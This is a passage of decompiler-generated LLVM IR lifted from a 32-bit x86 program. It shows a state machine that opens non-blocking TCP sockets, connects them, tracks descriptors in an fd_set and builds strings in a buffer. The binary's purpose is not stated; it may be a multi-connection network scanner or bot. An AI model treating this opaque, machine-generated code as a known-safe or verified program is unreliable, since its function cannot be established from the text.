  %v2_8048525 = inttoptr i32 %v1_8048525 to i32*
  store i32 0, i32* %v2_8048525, align 4
  %v0_804852d = load i32, i32* @esp, align 4
  %v1_804852d = add i32 %v0_804852d, 72
  %v2_804852d = inttoptr i32 %v1_804852d to i32*
  store i32 0, i32* %v2_804852d, align 4
  br label %dec_label_pc_80485a5

dec_label_pc_8048537:                             ; preds = %dec_label_pc_80485b6
  %v10_8048537 = icmp eq i8 %v3_80485a5, 2
  store i1 %v10_8048537, i1* %zf.global-to-local, align 1
  br i1 %v10_8048537, label %dec_label_pc_8048c9d, label %dec_label_pc_804853f

dec_label_pc_804853f:                             ; preds = %dec_label_pc_8048537
  %v10_804853f = icmp eq i8 %v3_80485a5, 4
  store i1 %v10_804853f, i1* %zf.global-to-local, align 1
  br i1 %v10_804853f, label %dec_label_pc_8048700, label %dec_label_pc_8048547

dec_label_pc_8048547:                             ; preds = %dec_label_pc_804853f
  %v10_8048547 = icmp eq i8 %v3_80485a5, 6
  store i1 %v10_8048547, i1* %zf.global-to-local, align 1
  br i1 %v10_8048547, label %dec_label_pc_80493a7, label %dec_label_pc_804854f

dec_label_pc_804854f:                             ; preds = %dec_label_pc_8048547
  %v10_804854f = icmp eq i8 %v3_80485a5, 7
  store i1 %v10_804854f, i1* %zf.global-to-local, align 1
  br i1 %v10_804854f, label %dec_label_pc_8049773, label %dec_label_pc_8048557

dec_label_pc_8048557:                             ; preds = %dec_label_pc_804854f
  %v10_8048557 = icmp eq i8 %v3_80485a5, 10
  store i1 %v10_8048557, i1* %zf.global-to-local, align 1
  br i1 %v10_8048557, label %dec_label_pc_8049829, label %dec_label_pc_8048557.dec_label_pc_804855f_crit_edge

dec_label_pc_8048557.dec_label_pc_804855f_crit_edge: ; preds = %dec_label_pc_8048557
  %v0_804855f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804855f

dec_label_pc_804855f:                             ; preds = %dec_label_pc_8048557.dec_label_pc_804855f_crit_edge, %dec_label_pc_8048c9d
  %v0_804855f = phi i32 [ %v0_804855f.pre, %dec_label_pc_8048557.dec_label_pc_804855f_crit_edge ], [ %v0_8048c9d, %dec_label_pc_8048c9d ]
  %v9_804855f = icmp eq i32 %v0_804855f, 12
  store i1 %v9_804855f, i1* %zf.global-to-local, align 1
  %v1_8048562 = add i32 %v0_80485a5, -1440
  %v2_8048562 = inttoptr i32 %v1_8048562 to i32*
  %v3_8048562 = load i32, i32* %v2_8048562, align 4
  store i32 %v3_8048562, i32* %edx.global-to-local, align 4
  store i8 0, i8* %v2_80485a5, align 1
  %v0_804856f = load i32, i32* %edx.global-to-local, align 4
  %v1_804856f = load i32, i32* @esp, align 4
  %v2_804856f = add i32 %v1_804856f, -4
  %v3_804856f = inttoptr i32 %v2_804856f to i32*
  store i32 %v0_804856f, i32* %v3_804856f, align 4
  %v1_8048570 = call i32 @function_8052241(i32 %stack_var_-20924.0.ph)
  store i32 %v1_8048570, i32* %eax.global-to-local, align 4
  %v0_8048575 = load i32, i32* @esi, align 4
  %v1_8048575 = add i32 %v0_8048575, -1440
  %v2_8048575 = inttoptr i32 %v1_8048575 to i32*
  store i32 -1, i32* %v2_8048575, align 4
  %v0_804857f = load i32, i32* @esp, align 4
  %v6_804857f = icmp eq i32 %v0_804857f, -16
  store i1 %v6_804857f, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048582

dec_label_pc_8048582:                             ; preds = %dec_label_pc_8049829, %dec_label_pc_8049773, %dec_label_pc_80493a7, %dec_label_pc_8048cb2, %dec_label_pc_8048c28, %dec_label_pc_8048601, %dec_label_pc_804861f, %dec_label_pc_80486e4, %dec_label_pc_804855f
  %v0_8048582 = load i32, i32* @esp, align 4
  %v1_8048582 = add i32 %v0_8048582, 100
  %v2_8048582 = inttoptr i32 %v1_8048582 to i32*
  %v3_8048582 = load i32, i32* %v2_8048582, align 4
  %v0_8048586 = load i32, i32* @ebp, align 4
  %v1_8048586 = add i32 %v0_8048586, 3140
  store i32 %v1_8048586, i32* @ebp, align 4
  %v1_804858c = add i32 %v3_8048582, 1
  store i32 %v1_804858c, i32* %eax.global-to-local, align 4
  %v0_804858d = load i32, i32* @esi, align 4
  %v1_804858d = add i32 %v0_804858d, 3140
  store i32 %v1_804858d, i32* @esi, align 4
  store i32 %v1_804858c, i32* %v2_8048582, align 4
  %v0_8048597 = load i32, i32* @esp, align 4
  %v1_8048597 = add i32 %v0_8048597, 100
  %v2_8048597 = inttoptr i32 %v1_8048597 to i32*
  %v3_8048597 = load i32, i32* %v2_8048597, align 4
  store i32 %v3_8048597, i32* @ecx, align 4
  %v1_804859b = add i32 %v0_8048597, 112
  %v2_804859b = inttoptr i32 %v1_804859b to i32*
  %v3_804859b = load i32, i32* %v2_804859b, align 4
  %v15_804859b = icmp eq i32 %v3_804859b, %v3_8048597
  store i1 %v15_804859b, i1* %zf.global-to-local, align 1
  br i1 %v15_804859b, label %dec_label_pc_8048cdd, label %dec_label_pc_80485a5

dec_label_pc_80485a5:                             ; preds = %dec_label_pc_8048582, %dec_label_pc_8048517
  %v0_80485a5 = load i32, i32* @esi, align 4
  %v1_80485a5 = add i32 %v0_80485a5, -1436
  %v2_80485a5 = inttoptr i32 %v1_80485a5 to i8*
  %v3_80485a5 = load i8, i8* %v2_80485a5, align 1
  %v4_80485a5 = zext i8 %v3_80485a5 to i32
  %v5_80485a5 = load i32, i32* %eax.global-to-local, align 4
  %v6_80485a5 = and i32 %v5_80485a5, -256
  %v7_80485a5 = or i32 %v6_80485a5, %v4_80485a5
  store i32 %v7_80485a5, i32* %eax.global-to-local, align 4
  %v0_80485ab = load i32, i32* @ebp, align 4
  %v1_80485ab = add i32 %v0_80485ab, -16
  store i32 %v1_80485ab, i32* @edi, align 4
  %v6_80485ae = icmp eq i8 %v3_80485a5, 0
  %v10_80485ae = icmp eq i8 %v3_80485a5, 1
  store i1 %v10_80485ae, i1* %zf.global-to-local, align 1
  br i1 %v10_80485ae, label %dec_label_pc_80486ee, label %dec_label_pc_80485b6

dec_label_pc_80485b6:                             ; preds = %dec_label_pc_80485a5
  store i1 %v6_80485ae, i1* %zf.global-to-local, align 1
  %v1_80485b8 = icmp eq i1 %v6_80485ae, false
  br i1 %v1_80485b8, label %dec_label_pc_8048537, label %dec_label_pc_80485be

dec_label_pc_80485be:                             ; preds = %dec_label_pc_80485b6, %dec_label_pc_8048c91
  %v0_80485be = load i32, i32* @esp, align 4
  %v1_80485be = add i32 %v0_80485be, 20868
  %v2_80485be = inttoptr i32 %v1_80485be to i32*
  store i32 0, i32* %v2_80485be, align 4
  %v0_80485c9 = load i32, i32* @esp, align 4
  %v1_80485c9 = add i32 %v0_80485c9, 20872
  %v2_80485c9 = inttoptr i32 %v1_80485c9 to i32*
  store i32 0, i32* %v2_80485c9, align 4
  %v0_80485d4 = load i32, i32* @esp, align 4
  %v1_80485d4 = add i32 %v0_80485d4, 20876
  %v2_80485d4 = inttoptr i32 %v1_80485d4 to i32*
  store i32 0, i32* %v2_80485d4, align 4
  %v0_80485df = load i32, i32* @esp, align 4
  %v1_80485df = add i32 %v0_80485df, 20880
  %v2_80485df = inttoptr i32 %v1_80485df to i32*
  store i32 0, i32* %v2_80485df, align 4
  %v0_80485ea = load i32, i32* @esi, align 4
  %v1_80485ea = add i32 %v0_80485ea, -1440
  %v2_80485ea = inttoptr i32 %v1_80485ea to i32*
  %v3_80485ea = load i32, i32* %v2_80485ea, align 4
  store i32 %v3_80485ea, i32* %eax.global-to-local, align 4
  %v10_80485f0 = icmp eq i32 %v3_80485ea, -1
  store i1 %v10_80485f0, i1* %zf.global-to-local, align 1
  %v1_8048601.pre = load i32, i32* @esp, align 4
  br i1 %v10_80485f0, label %dec_label_pc_8048601, label %dec_label_pc_80485f5

dec_label_pc_80485f5:                             ; preds = %dec_label_pc_80485be
  %v9_80485f5 = icmp eq i32 %v1_8048601.pre, 12
  store i1 %v9_80485f5, i1* %zf.global-to-local, align 1
  %v2_80485f8 = add i32 %v1_8048601.pre, -16
  %v3_80485f8 = inttoptr i32 %v2_80485f8 to i32*
  store i32 %v3_80485ea, i32* %v3_80485f8, align 4
  %v1_80485f9 = call i32 @function_8052241(i32 %stack_var_-20924.0.ph)
  store i32 %v1_80485f9, i32* %eax.global-to-local, align 4
  %v0_80485fe = load i32, i32* @esp, align 4
  %v1_80485fe = add i32 %v0_80485fe, 16
  %v6_80485fe = icmp eq i32 %v1_80485fe, 0
  store i1 %v6_80485fe, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048601

dec_label_pc_8048601:                             ; preds = %dec_label_pc_80485be, %dec_label_pc_80485f5
  %v1_8048601 = phi i32 [ %v1_80485fe, %dec_label_pc_80485f5 ], [ %v1_8048601.pre, %dec_label_pc_80485be ]
  %v0_8048601 = load i32, i32* @ecx, align 4
  %v2_8048601 = add i32 %v1_8048601, -4
  %v3_8048601 = inttoptr i32 %v2_8048601 to i32*
  store i32 %v0_8048601, i32* %v3_8048601, align 4
  %v1_8048602 = add i32 %v1_8048601, -8
  %v2_8048602 = inttoptr i32 %v1_8048602 to i32*
  store i32 0, i32* %v2_8048602, align 4
  %v1_8048604 = add i32 %v1_8048601, -12
  %v2_8048604 = inttoptr i32 %v1_8048604 to i32*
  store i32 1, i32* %v2_8048604, align 4
  %v1_8048606 = add i32 %v1_8048601, -16
  %v2_8048606 = inttoptr i32 %v1_8048606 to i32*
  store i32 2, i32* %v2_8048606, align 4
  %v3_8048608 = call i32 @function_8052a35(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048608, i32* %eax.global-to-local, align 4
  %v1_8048610 = load i32, i32* @esi, align 4
  %v2_8048610 = add i32 %v1_8048610, -1440
  %v3_8048610 = inttoptr i32 %v2_8048610 to i32*
  store i32 %v3_8048608, i32* %v3_8048610, align 4
  %v10_8048616 = icmp eq i32 %v3_8048608, -1
  store i1 %v10_8048616, i1* %zf.global-to-local, align 1
  br i1 %v10_8048616, label %dec_label_pc_8048582, label %dec_label_pc_804861f

dec_label_pc_804861f:                             ; preds = %dec_label_pc_8048601
  %v0_804861f = load i32, i32* @edx, align 4
  %v1_804861f = load i32, i32* @esp, align 4
  %v2_804861f = add i32 %v1_804861f, -4
  %v3_804861f = inttoptr i32 %v2_804861f to i32*
  store i32 %v0_804861f, i32* %v3_804861f, align 4
  %v1_8048620 = add i32 %v1_804861f, -8
  %v2_8048620 = inttoptr i32 %v1_8048620 to i32*
  store i32 0, i32* %v2_8048620, align 4
  %v1_8048622 = add i32 %v1_804861f, -12
  %v2_8048622 = inttoptr i32 %v1_8048622 to i32*
  store i32 3, i32* %v2_8048622, align 4
  %v2_8048624 = add i32 %v1_804861f, -16
  %v3_8048624 = inttoptr i32 %v2_8048624 to i32*
  store i32 %v3_8048608, i32* %v3_8048624, align 4
  %v3_8048625 = call i32 @function_805217d(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804862a = load i32, i32* @esp, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  %v12_804862d = or i32 %v3_8048625, 2048
  store i32 %v12_804862d, i32* %eax.global-to-local, align 4
  %v2_8048630 = add i32 %v0_804862a, 8
  %v3_8048630 = inttoptr i32 %v2_8048630 to i32*
  store i32 %v12_804862d, i32* %v3_8048630, align 4
  %v1_8048631 = add i32 %v0_804862a, 4
  %v2_8048631 = inttoptr i32 %v1_8048631 to i32*
  store i32 4, i32* %v2_8048631, align 4
  %v0_8048633 = load i32, i32* @esi, align 4
  %v1_8048633 = add i32 %v0_8048633, -1440
  %v2_8048633 = inttoptr i32 %v1_8048633 to i32*
  %v3_8048633 = load i32, i32* %v2_8048633, align 4
  store i32 %v3_8048633, i32* %eax.global-to-local, align 4
  %v3_8048639 = inttoptr i32 %v0_804862a to i32*
  store i32 %v3_8048633, i32* %v3_8048639, align 4
  %v3_804863a = call i32 @function_805217d(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804863f = load i32, i32* @esp, align 4
  %v1_804863f = add i32 %v0_804863f, 20916
  store i32 %v1_804863f, i32* %eax.global-to-local, align 4
  %v2_8048646 = inttoptr i32 %v1_804863f to i32*
  store i32 65535, i32* %v2_8048646, align 4
  %v0_8048651 = load i32, i32* @esp, align 4
  %v1_8048651 = inttoptr i32 %v0_8048651 to i32*
  store i32 4, i32* %v1_8048651, align 4
  %v0_8048658 = load i32, i32* %eax.global-to-local, align 4
  %v1_8048658 = load i32, i32* @esp, align 4
  %v2_8048658 = add i32 %v1_8048658, -4
  %v3_8048658 = inttoptr i32 %v2_8048658 to i32*
  store i32 %v0_8048658, i32* %v3_8048658, align 4
  %v1_8048659 = add i32 %v1_8048658, -8
  %v2_8048659 = inttoptr i32 %v1_8048659 to i32*
  store i32 8, i32* %v2_8048659, align 4
  %v1_804865b = add i32 %v1_8048658, -12
  %v2_804865b = inttoptr i32 %v1_804865b to i32*
  store i32 0, i32* %v2_804865b, align 4
  %v0_804865d = load i32, i32* @esi, align 4
  %v1_804865d = add i32 %v0_804865d, -1440
  %v2_804865d = inttoptr i32 %v1_804865d to i32*
  %v3_804865d = load i32, i32* %v2_804865d, align 4
  store i32 %v3_804865d, i32* %eax.global-to-local, align 4
  %v2_8048663 = add i32 %v1_8048658, -16
  %v3_8048663 = inttoptr i32 %v2_8048663 to i32*
  store i32 %v3_804865d, i32* %v3_8048663, align 4
  %v5_8048664 = call i32 @function_80529fa(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8048664, i32* %eax.global-to-local, align 4
  %v0_8048669 = load i32, i32* @esi, align 4
  %v1_8048669 = add i32 %v0_8048669, -1424
  %v2_8048669 = inttoptr i32 %v1_8048669 to i32*
  %v3_8048669 = load i32, i32* %v2_8048669, align 4
  store i32 %v3_8048669, i32* %eax.global-to-local, align 4
  %v0_804866f = load i32, i32* @esp, align 4
  %v1_804866f = add i32 %v0_804866f, 112
  %v2_804866f = inttoptr i32 %v1_804866f to i32*
  %v3_804866f = load i32, i32* %v2_804866f, align 4
  store i32 %v3_804866f, i32* %edx.global-to-local, align 4
  %v2_8048673 = add i32 %v0_804866f, 20904
  %v3_8048673 = inttoptr i32 %v2_8048673 to i32*
  store i32 %v3_8048669, i32* %v3_8048673, align 4
  %v0_804867a = load i32, i32* @esp, align 4
  %v1_804867a = add i32 %v0_804867a, 20900
  %v2_804867a = inttoptr i32 %v1_804867a to i16*
  store i16 2, i16* %v2_804867a, align 2
  %v0_8048684 = load i32, i32* @esp, align 4
  %v1_8048684 = add i32 %v0_8048684, 102
  %v2_8048684 = inttoptr i32 %v1_8048684 to i16*
  %v3_8048684 = load i16, i16* %v2_8048684, align 2
  %v5_8048684 = load i32, i32* %eax.global-to-local, align 4
  %v6_8048684 = and i32 %v5_8048684, -65536
  %v0_8048689 = load i32, i32* %edx.global-to-local, align 4
  %v1_8048689 = load i32, i32* @esi, align 4
  %v2_8048689 = add i32 %v1_8048689, -1432
  %v3_8048689 = inttoptr i32 %v2_8048689 to i32*
  store i32 %v0_8048689, i32* %v3_8048689, align 4
  %v2_804868f = call i16 @llvm.bswap.i16(i16 %v3_8048684)
  %v3_804868f = zext i16 %v2_804868f to i32
  %v6_804868f = or i32 %v3_804868f, %v6_8048684
  store i32 %v6_804868f, i32* %eax.global-to-local, align 4
  %v2_8048693 = load i32, i32* @esp, align 4
  %v3_8048693 = add i32 %v2_8048693, 20902
  %v4_8048693 = inttoptr i32 %v3_8048693 to i16*
  store i16 %v2_804868f, i16* %v4_8048693, align 2
  %v0_804869b = load i32, i32* @esp, align 4
  %v9_804869b = icmp eq i32 %v0_804869b, -28
  store i1 %v9_804869b, i1* %zf.global-to-local, align 1
  %v0_804869e = load i32, i32* @esi, align 4
  %v1_804869e = add i32 %v0_804869e, -1436
  %v2_804869e = inttoptr i32 %v1_804869e to i8*
  store i8 2, i8* %v2_804869e, align 1
  %v0_80486a5 = load i32, i32* @esp, align 4
  %v1_80486a5 = add i32 %v0_80486a5, -4
  %v2_80486a5 = inttoptr i32 %v1_80486a5 to i32*
  store i32 16, i32* %v2_80486a5, align 4
  %v1_80486a7 = add i32 %v0_80486a5, 20872
  store i32 %v1_80486a7, i32* %ecx.global-to-local, align 4
  %v2_80486ae = add i32 %v0_80486a5, -8
  %v3_80486ae = inttoptr i32 %v2_80486ae to i32*
  store i32 %v1_80486a7, i32* %v3_80486ae, align 4
  %v0_80486af = load i32, i32* @esi, align 4
  %v1_80486af = add i32 %v0_80486af, -1440
  %v2_80486af = inttoptr i32 %v1_80486af to i32*
  %v3_80486af = load i32, i32* %v2_80486af, align 4
  store i32 %v3_80486af, i32* @edi, align 4
  %v2_80486b5 = add i32 %v0_80486a5, -12
  %v3_80486b5 = inttoptr i32 %v2_80486b5 to i32*
  store i32 %v3_80486af, i32* %v3_80486b5, align 4
  %v3_80486b6 = call i32 @function_805285a(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80486b6, i32* %eax.global-to-local, align 4
  %v0_80486bb = load i32, i32* @esi, align 4
  %v1_80486bb = add i32 %v0_80486bb, -1440
  %v2_80486bb = inttoptr i32 %v1_80486bb to i32*
  %v3_80486bb = load i32, i32* %v2_80486bb, align 4
  %v1_80486c3 = urem i32 %v3_80486bb, 32
  store i32 %v1_80486c3, i32* %eax.global-to-local, align 4
  %v2_80486c6 = udiv i32 %v3_80486bb, 32
  store i32 %v2_80486c6, i32* %edx.global-to-local, align 4
  %v0_80486c9 = load i32, i32* @esp, align 4
  %v2_80486c9 = mul nuw nsw i32 %v2_80486c6, 4
  %v3_80486c9 = add nuw nsw i32 %v2_80486c9, 20628
  %v4_80486c9 = add i32 %v3_80486c9, %v0_80486c9
  %v5_80486c9 = inttoptr i32 %v4_80486c9 to i32*
  %v6_80486c9 = load i32, i32* %v5_80486c9, align 4
  %v9_80486c9 = shl i32 1, %v1_80486c3
  %v12_80486c9 = or i32 %v6_80486c9, %v9_80486c9
  store i32 %v12_80486c9, i32* %v5_80486c9, align 4
  %v0_80486d1 = load i32, i32* @esp, align 4
  %v1_80486d1 = add i32 %v0_80486d1, 16
  %v0_80486d4 = load i32, i32* @esi, align 4
  %v1_80486d4 = add i32 %v0_80486d4, -1440
  %v2_80486d4 = inttoptr i32 %v1_80486d4 to i32*
  %v3_80486d4 = load i32, i32* %v2_80486d4, align 4
  store i32 %v3_80486d4, i32* %eax.global-to-local, align 4
  %v1_80486da = add i32 %v0_80486d1, 88
  %v2_80486da = inttoptr i32 %v1_80486da to i32*
  %v3_80486da = load i32, i32* %v2_80486da, align 4
  %v5_80486da = sub i32 %v3_80486da, %v3_80486d4
  %v11_80486da = xor i32 %v3_80486da, %v3_80486d4
  %v12_80486da = xor i32 %v5_80486da, %v3_80486da
  %v13_80486da = and i32 %v12_80486da, %v11_80486da
  %v14_80486da = icmp slt i32 %v13_80486da, 0
  %v15_80486da = icmp eq i32 %v5_80486da, 0
  store i1 %v15_80486da, i1* %zf.global-to-local, align 1
  %v16_80486da = icmp slt i32 %v5_80486da, 0
  %v2_80486de = icmp eq i1 %v16_80486da, %v14_80486da
  br i1 %v2_80486de, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_80486e4:                             ; preds = %dec_label_pc_8049829, %dec_label_pc_8049773, %dec_label_pc_80493a7, %dec_label_pc_8048cb2, %dec_label_pc_8048c28, %dec_label_pc_804861f
  %v1_80486e5 = phi i32 [ %v1_8049845, %dec_label_pc_8049829 ], [ %v1_804978f, %dec_label_pc_8049773 ], [ %v1_80493c3, %dec_label_pc_80493a7 ], [ %v0_8048cce, %dec_label_pc_8048cb2 ], [ %v1_8048c79, %dec_label_pc_8048c28 ], [ %v1_80486d1, %dec_label_pc_804861f ]
  %v0_80486e4 = phi i32 [ %v3_804983f, %dec_label_pc_8049829 ], [ %v3_8049789, %dec_label_pc_8049773 ], [ %v3_80493bd, %dec_label_pc_80493a7 ], [ %v3_8048cc8, %dec_label_pc_8048cb2 ], [ %v3_8048c7c, %dec_label_pc_8048c28 ], [ %v3_80486d4, %dec_label_pc_804861f ]
  %v1_80486e4 = add i32 %v0_80486e4, 1
  %v8_80486e4 = icmp eq i32 %v1_80486e4, 0
  store i1 %v8_80486e4, i1* %zf.global-to-local, align 1
  store i32 %v1_80486e4, i32* %eax.global-to-local, align 4
  %v2_80486e5 = add i32 %v1_80486e5, 72
  %v3_80486e5 = inttoptr i32 %v2_80486e5 to i32*
  store i32 %v1_80486e4, i32* %v3_80486e5, align 4
  br label %dec_label_pc_8048582

dec_label_pc_80486ee:                             ; preds = %dec_label_pc_80485a5
  %v1_80486ee = add i32 %v0_80485a5, 16
  %v2_80486ee = inttoptr i32 %v1_80486ee to i32*
  %v3_80486ee = load i32, i32* %v2_80486ee, align 4
  store i32 %v3_80486ee, i32* @ebx, align 4
  %v1_80486f1 = icmp eq i32 %v3_80486ee, 0
  store i1 %v1_80486f1, i1* %zf.global-to-local, align 1
  br i1 %v1_80486f1, label %dec_label_pc_8048c91, label %dec_label_pc_80486f9

dec_label_pc_80486f9:                             ; preds = %dec_label_pc_80486ee
  store i8 4, i8* %v2_80485a5, align 1
  %v0_8048700.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8048700

dec_label_pc_8048700:                             ; preds = %dec_label_pc_804853f, %dec_label_pc_80486f9
  %v0_8048700 = phi i32 [ %v0_80485a5, %dec_label_pc_804853f ], [ %v0_8048700.pre, %dec_label_pc_80486f9 ]
  %v1_8048700 = add i32 %v0_8048700, 24
  %v2_8048700 = inttoptr i32 %v1_8048700 to i32*
  store i32 -1, i32* %v2_8048700, align 4
  %v0_8048707 = load i32, i32* @esi, align 4
  %v1_8048707 = add i32 %v0_8048707, 12
  %v2_8048707 = inttoptr i32 %v1_8048707 to i32*
  store i32 0, i32* %v2_8048707, align 4
  %v0_804870e = load i32, i32* @edi, align 4
  %v1_804870e = add i32 %v0_804870e, 2116
  store i32 %v1_804870e, i32* @eax, align 4
  %v0_8048714 = load i32, i32* @ecx, align 4
  %v1_8048714 = load i32, i32* @esp, align 4
  %v2_8048714 = add i32 %v1_8048714, -4
  %v3_8048714 = inttoptr i32 %v2_8048714 to i32*
  store i32 %v0_8048714, i32* %v3_8048714, align 4
  %v0_8048715 = load i32, i32* @ecx, align 4
  %v2_8048715 = add i32 %v1_8048714, -8
  %v3_8048715 = inttoptr i32 %v2_8048715 to i32*
  store i32 %v0_8048715, i32* %v3_8048715, align 4
  %v1_8048716 = add i32 %v1_8048714, -12
  %v2_8048716 = inttoptr i32 %v1_8048716 to i32*
  store i32 1024, i32* %v2_8048716, align 4
  %v0_804871b = load i32, i32* @eax, align 4
  %v2_804871b = add i32 %v1_8048714, -16
  %v3_804871b = inttoptr i32 %v2_804871b to i32*
  store i32 %v0_804871b, i32* %v3_804871b, align 4
  %v2_804871c = call i32 @function_8051d30(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804871c, i32* %eax.global-to-local, align 4
  %v0_8048721 = load i32, i32* @esi, align 4
  %v1_8048721 = add i32 %v0_8048721, 672
  %v2_8048721 = inttoptr i32 %v1_8048721 to i32*
  store i32 0, i32* %v2_8048721, align 4
  %v0_804872b = load i32, i32* @esp, align 4
  %v1_804872b = inttoptr i32 %v0_804872b to i32*
  %v2_804872b = load i32, i32* %v1_804872b, align 4
  store i32 %v2_804872b, i32* %eax.global-to-local, align 4
  %v3_804872b = add i32 %v0_804872b, 4
  %v1_804872c = inttoptr i32 %v3_804872b to i32*
  %v2_804872c = load i32, i32* %v1_804872c, align 4
  store i32 %v2_804872c, i32* %edx.global-to-local, align 4
  store i32 10240, i32* %v1_804872c, align 4
  %v1_8048732 = add i32 %v0_804872b, 10388
  store i32 %v1_8048732, i32* @eax, align 4
  store i32 %v1_8048732, i32* %v1_804872b, align 4
  %v2_804873a = call i32 @function_8051d30(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804873a, i32* %eax.global-to-local, align 4
  %v0_804873f = load i32, i32* @edi, align 4
  %v1_804873f = add i32 %v0_804873f, 1431
  store i32 %v1_804873f, i32* %edx.global-to-local, align 4
  %v1_8048745 = load i32, i32* @esp, align 4
  %v2_8048745 = add i32 %v1_8048745, 112
  %v3_8048745 = inttoptr i32 %v2_8048745 to i32*
  store i32 %v1_804873f, i32* %v3_8048745, align 4
  %v0_8048749 = load i32, i32* @esp, align 4
  %v1_8048749 = inttoptr i32 %v0_8048749 to i32*
  %v2_8048749 = load i32, i32* %v1_8048749, align 4
  store i32 %v2_8048749, i32* %eax.global-to-local, align 4
  %v1_804874a = add i32 %v0_8048749, 10388
  store i32 %v1_804874a, i32* %ecx.global-to-local, align 4
  store i32 %v1_804874a, i32* %v1_8048749, align 4
  %v2_8048752 = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_8048752, i32* %eax.global-to-local, align 4
  %v0_8048757 = load i32, i32* @esp, align 4
  %v1_8048757 = inttoptr i32 %v0_8048757 to i32*
  %v2_8048757 = load i32, i32* %v1_8048757, align 4
  store i32 %v2_8048757, i32* %ecx.global-to-local, align 4
  %v3_8048757 = add i32 %v0_8048757, 4
  %v1_8048758 = inttoptr i32 %v3_8048757 to i32*
  %v2_8048758 = load i32, i32* %v1_8048758, align 4
  store i32 %v2_8048758, i32* @ebx, align 4
  %v1_8048759 = add i32 %v0_8048757, 112
  %v2_8048759 = inttoptr i32 %v1_8048759 to i32*
  %v3_8048759 = load i32, i32* %v2_8048759, align 4
  store i32 %v3_8048759, i32* %v1_8048758, align 4
  %v1_804875e = add i32 %v0_8048757, 10388
  store i32 %v1_804875e, i32* %edx.global-to-local, align 4
  %v2_8048765 = add i32 %v1_804875e, %v2_8048752
  store i32 %v2_8048765, i32* %eax.global-to-local, align 4
  store i32 %v2_8048765, i32* %v1_8048757, align 4
  %v3_8048769 = call i32 @function_8051cc0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048769, i32* %eax.global-to-local, align 4
  %v0_804876e = load i32, i32* @esp, align 4
  %v1_804876e = inttoptr i32 %v0_804876e to i32*
  %v2_804876e = load i32, i32* %v1_804876e, align 4
  store i32 %v2_804876e, i32* @ebx, align 4
  %v1_804876f = add i32 %v0_804876e, 10388
  store i32 %v1_804876f, i32* %ecx.global-to-local, align 4
  store i32 %v1_804876f, i32* %v1_804876e, align 4
  %v2_8048777 = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_8048777, i32* %eax.global-to-local, align 4
  %v0_804877c = load i32, i32* @esp, align 4
  %v1_804877c = inttoptr i32 %v0_804877c to i32*
  %v2_804877c = load i32, i32* %v1_804877c, align 4
  store i32 %v2_804877c, i32* %edx.global-to-local, align 4
  %v3_804877c = add i32 %v0_804877c, 4
  %v1_804877d = inttoptr i32 %v3_804877c to i32*
  %v2_804877d = load i32, i32* %v1_804877d, align 4
  store i32 %v2_804877d, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8054b5f.7 to i32), i32* %v1_804877d, align 4
  %v1_8048783 = add i32 %v0_804877c, 10388
  store i32 %v1_8048783, i32* %edx.global-to-local, align 4
  %v2_804878a = add i32 %v1_8048783, %v2_8048777
  store i32 %v2_804878a, i32* %eax.global-to-local, align 4
  store i32 %v2_804878a, i32* %v1_804877c, align 4
  %v3_804878e = call i32 @function_8051cc0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804878e, i32* %eax.global-to-local, align 4
  %v0_8048793 = load i32, i32* @esp, align 4
  %v1_8048793 = inttoptr i32 %v0_8048793 to i32*
  %v2_8048793 = load i32, i32* %v1_8048793, align 4
  store i32 %v2_8048793, i32* @ebx, align 4
  %v1_8048794 = add i32 %v0_8048793, 10388
  store i32 %v1_8048794, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048794, i32* %v1_8048793, align 4
  %v2_804879c = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_804879c, i32* %eax.global-to-local, align 4
  %v0_80487a1 = load i32, i32* @esp, align 4
  %v1_80487a1 = inttoptr i32 %v0_80487a1 to i32*
  %v3_80487a1 = add i32 %v0_80487a1, 4
  %v0_80487a2 = load i32, i32* @edi, align 4
  %v1_80487a2 = add i32 %v0_80487a2, 532
  store i32 %v1_80487a2, i32* %edx.global-to-local, align 4
  %v1_80487a8 = inttoptr i32 %v3_80487a1 to i32*
  %v2_80487a8 = load i32, i32* %v1_80487a8, align 4
  store i32 %v2_80487a8, i32* %ecx.global-to-local, align 4
  store i32 %v1_80487a2, i32* %v1_80487a8, align 4
  %v1_80487aa = add i32 %v0_80487a1, 10388
  store i32 %v1_80487aa, i32* %edx.global-to-local, align 4
  %v2_80487b1 = add i32 %v1_80487aa, %v2_804879c
  store i32 %v2_80487b1, i32* %eax.global-to-local, align 4
  store i32 %v2_80487b1, i32* %v1_80487a1, align 4
  %v3_80487b5 = call i32 @function_8051cc0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80487b5, i32* %eax.global-to-local, align 4
  %v0_80487ba = load i32, i32* @esp, align 4
  %v1_80487ba = inttoptr i32 %v0_80487ba to i32*
  %v2_80487ba = load i32, i32* %v1_80487ba, align 4
  store i32 %v2_80487ba, i32* @ebx, align 4
